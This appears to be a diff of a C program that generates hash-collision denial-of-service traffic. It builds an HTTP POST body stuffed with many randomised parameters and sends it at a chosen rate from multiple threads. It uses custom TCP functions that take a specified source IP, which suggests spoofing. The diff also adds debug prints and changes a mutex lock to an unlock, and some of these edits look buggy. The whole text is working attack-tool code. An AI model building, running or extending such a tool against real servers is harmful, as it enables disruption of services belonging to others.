@@ -28,8 +28,8 @@ pthread_cond_t g_hash_dos_cond;
 struct timespec g_hash_dos_before_time;
 struct timespec g_hash_dos_now_time;
 
-char hash_dos_content[800001];
-char hash_dos_method[800300];
+char hash_dos_content[1001];
+char hash_dos_method[1300];
 
 void hash_dos_print_usage(void)
 {
@@ -55,19 +55,32 @@ void *generate_hash_dos(void *data)
 				g_hash_dos_now_src_ip,
 				g_hash_dos_now_dest_ip,
 				&g_hash_dos_now_dest_port);
-		// wait a second
-		if (g_hash_dos_num_generated_in_sec >= g_hash_dos_request_per_sec) {
-			pthread_cond_wait(&g_hash_dos_cond, &g_hash_dos_mutex);
-		}
+
 		// time check
 		time_check(
 				&g_hash_dos_cond,
 				&g_hash_dos_before_time,
 				&g_hash_dos_now_time,
 				&g_hash_dos_num_generated_in_sec);
+
+		// wait a second
+		if (g_hash_dos_num_generated_in_sec >= g_hash_dos_request_per_sec) {
+			pthread_cond_wait(&g_hash_dos_cond, &g_hash_dos_mutex);
+		}
+
 		// make socket
+		int src_port,seq,ack;
 		int sock;
-		if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
+		sock =  tcp_make_connection(
+				inet_addr(g_hash_dos_now_src_ip),
+				inet_addr(g_hash_dos_now_dest_ip),
+				&src_port,
+				g_hash_dos_now_dest_port,
+				&seq,
+				&ack,
+				0);
+
+		/*if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
 			fprintf(stderr, "socket error %d %s\n", errno, strerror(errno));
 			exit(1);
 		}
@@ -79,13 +92,25 @@ void *generate_hash_dos(void *data)
 		if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
 			fprintf(stderr, "connect error %d %s\n", errno, strerror(errno));
 			exit(1);
-		}
+		}*/
+
+		tcp_socket_send_data(
+				sock,
+				inet_addr(g_hash_dos_now_src_ip),
+				inet_addr(g_hash_dos_now_dest_ip),
+				src_port,
+				g_hash_dos_now_dest_port,
+				hash_dos_method,
+				strlen(hash_dos_method),
+				seq,
+				ack,
+				0);
+/*
 		if (send(sock, hash_dos_method, strlen(hash_dos_method), 0) < 0) {
 			fprintf(stderr, "send error %d %s\n", errno, strerror(errno));
 			exit(1);
-		}
+		}*/
 		close(sock);
-		printf("%ld\n", g_hash_dos_num_generated_in_sec);
 		g_hash_dos_num_generated_in_sec++;
 		g_hash_dos_num_total++;
 		pthread_mutex_unlock(&g_hash_dos_mutex);
@@ -102,7 +127,7 @@ void *hash_dos_time_check(void *data)
 				&g_hash_dos_before_time,
 				&g_hash_dos_now_time,
 				&g_hash_dos_num_generated_in_sec);
-		pthread_mutex_lock(&g_hash_dos_mutex);
+		pthread_mutex_unlock(&g_hash_dos_mutex);
 	}
 	return NULL;
 }
@@ -110,6 +135,8 @@ void *hash_dos_time_check(void *data)
 void hash_dos_main(char *argv[])
 {
 	// argument check
+
+
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
@@ -130,14 +157,24 @@ void hash_dos_main(char *argv[])
 	g_hash_dos_num_total = 0;
 	// prepare arbitary post method args
 	srand(time(NULL));
+
 	char arg[21] = "arrrarrarrarrAaAa=1&";
-	for (int i = 0; i < 40000; i++) {
+	int index = 0,j=0;
+	for (int i = 0; i < 50; i++) {
 		arg[13] = rand() % 26 + 'A';
 		arg[14] = rand() % 26 + 'a';
 		arg[15] = rand() % 26 + 'A';
 		arg[16] = rand() % 26 + 'a';
-		strcat(hash_dos_content, arg);
+		printf("%d\n",i);
+		for(j=0;j<21;j++)
+		{
+			hash_dos_content[index+j] = arg[j];
+		}
+		index+=20;
 	}
+	hash_dos_content[index] = '\0';
+	printf("IN HERE!\n");
+
 	sprintf(hash_dos_method,
 		"POST / HTTP/1.1\r\nHost: %s\r\n"
 		"User-Agent: python-requests/2.22.0\r\n"
@@ -151,10 +188,14 @@ void hash_dos_main(char *argv[])
 	sprintf(hash_dos_method + strlen(hash_dos_method), "%s\r\n", hash_dos_content);
 	memset(&g_hash_dos_before_time, 0, sizeof(struct timespec));
 	memset(&g_hash_dos_now_time, 0, sizeof(struct timespec));
+
+
+
 	g_hash_dos_request_per_sec = atoi(argv[3]);
 	const int num_threads = g_num_threads;
 	pthread_t threads[9999];
 	int thread_ids[9999];
+
 	printf("Sending hash_dos requests to %s per %d\n",
 			g_hash_dos_dest_ip, g_hash_dos_request_per_sec);
 	int i;
